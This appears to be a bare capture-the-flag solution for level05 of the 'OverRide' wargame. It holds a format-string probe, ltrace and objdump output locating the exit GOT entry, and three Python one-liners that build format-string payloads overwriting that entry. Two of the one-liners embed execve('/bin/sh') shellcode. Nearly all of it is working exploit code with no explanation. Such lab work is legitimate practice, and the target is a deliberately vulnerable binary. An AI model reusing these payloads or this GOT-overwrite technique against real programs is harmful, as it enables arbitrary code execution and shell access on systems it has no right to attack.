```
$> python -c "import struct; print('AAAABBBB' + '%x ' * 11)" | ./level05
aaaabbbb64 f7f39580 1 0 1 f7f99980 ffffffff 1 0 61616161 62626262
```

<pre>
echo | ltrace ./level05 1>&-
\__libc_start_main(0x8048444, 1, -10540, 0x8048520, 0x8048590 <unfinished ...>
<strong>fgets("\n", 100, 0xf7fcfac0)     = 0xffffd5c8</strong>
printf("\n")                     = 1
exit(0 <unfinished ...>
+++ exited (status 0) +++
</pre>

<pre>
level05@OverRide:~$ objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
<strong>080497e0 R_386_JUMP_SLOT   exit</strong>
080497e4 R_386_JUMP_SLOT   __libc_start_main
</pre>

```
(python -c "import struct; print('AAAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e1) + struct.pack('<I', 0x080497e2) + struct.pack('<I', 0x080497e3) + '%180d' + '%11\$n' + '%13d' + '%12\$n' + '%42d' + '%13\$n' + '%14\$n')")
```
```
(python -c "import struct; print('jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' + 'AAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e1) + struct.pack('<I', 0x080497e2) + struct.pack('<I', 0x080497e3) + '%140d' + '%21\$n' + '%13d' + '%22\$n' + '%42d' + '%23\$n' + '%24\$n')")
```
```
(python -c "import struct; print('jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' + 'AAA' + struct.pack('<I', 0x080497e0) + struct.pack('<I', 0x080497e2) + '%54676d' + '%21\$n' + '%10807d' + '%22\$n')")
```
